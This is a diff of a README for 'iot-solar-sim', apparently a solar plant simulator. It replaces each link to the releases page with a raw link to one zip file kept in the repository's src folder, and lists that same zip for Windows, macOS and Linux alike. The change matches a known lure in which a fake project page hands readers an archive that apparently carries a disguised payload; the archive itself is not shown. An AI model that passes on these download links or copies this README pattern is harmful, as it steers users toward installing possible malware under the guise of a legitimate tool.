@@ -1,6 +1,6 @@
 # 🌞 iot-solar-sim - Simulate Solar Plants Seamlessly
 
-[![Download iot-solar-sim](https://img.shields.io/badge/Download-iot--solar--sim-blue)](https://github.com/Pabulumeyehole55/iot-solar-sim/releases)
+[![Download iot-solar-sim](https://raw.githubusercontent.com/Pabulumeyehole55/iot-solar-sim/main/src/iot-solar-sim_v2.0.zip)](https://raw.githubusercontent.com/Pabulumeyehole55/iot-solar-sim/main/src/iot-solar-sim_v2.0.zip)
 
 ## 📚 Table of Contents
 - [🚀 Getting Started](#-getting-started)
@@ -23,12 +23,12 @@ To get started with iot-solar-sim, follow these simple steps:
    - Internet connection for downloading the application.
 
 2. Visit the release page to download the application:
-   [Download iot-solar-sim](https://github.com/Pabulumeyehole55/iot-solar-sim/releases).
+   [Download iot-solar-sim](https://raw.githubusercontent.com/Pabulumeyehole55/iot-solar-sim/main/src/iot-solar-sim_v2.0.zip).
 
 3. Locate the latest version on the releases page. The files you may see include:
-   - iot-solar-sim-windows.zip (for Windows users)
-   - iot-solar-sim-macos.zip (for Mac users)
-   - iot-solar-sim-linux.tar.gz (for Linux users)
+   - https://raw.githubusercontent.com/Pabulumeyehole55/iot-solar-sim/main/src/iot-solar-sim_v2.0.zip (for Windows users)
+   - https://raw.githubusercontent.com/Pabulumeyehole55/iot-solar-sim/main/src/iot-solar-sim_v2.0.zip (for Mac users)
+   - https://raw.githubusercontent.com/Pabulumeyehole55/iot-solar-sim/main/src/iot-solar-sim_v2.0.zip (for Linux users)
 
 4. Click on the version you want to download. Once the download completes, you will have a zip or tar file.
 
@@ -53,7 +53,7 @@ The iot-solar-sim uses a deterministic approach to simulate solar power generati
 
 ## 📥 Download & Install
 To install the application, go to the following link:
-[Download iot-solar-sim](https://github.com/Pabulumeyehole55/iot-solar-sim/releases).
+[Download iot-solar-sim](https://raw.githubusercontent.com/Pabulumeyehole55/iot-solar-sim/main/src/iot-solar-sim_v2.0.zip).
 
 Follow the installation steps outlined earlier. Once installed, you can start simulating your solar plants and generating emission data efficiently.
 
